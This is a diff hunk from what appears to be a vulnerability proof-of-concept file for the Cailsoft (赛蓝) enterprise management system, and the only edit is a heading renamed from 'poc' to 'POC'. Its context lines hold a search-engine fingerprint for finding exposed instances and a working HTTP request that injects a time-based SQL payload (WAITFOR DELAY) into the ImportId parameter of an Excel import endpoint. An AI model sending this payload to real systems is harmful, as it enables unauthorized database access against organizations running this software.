@@ -8,7 +8,7 @@
 body="www.cailsoft.com" || body="赛蓝企业管理系统"
 ```
 
-## poc
+## POC
 
 ```java
 GET /BaseModule/ExcelImport/GetImportDetailJson?ImportId=1%27%3bWAITFOR+DELAY+%270%3a0%3a5%27--&IsShow=1 HTTP/1.1
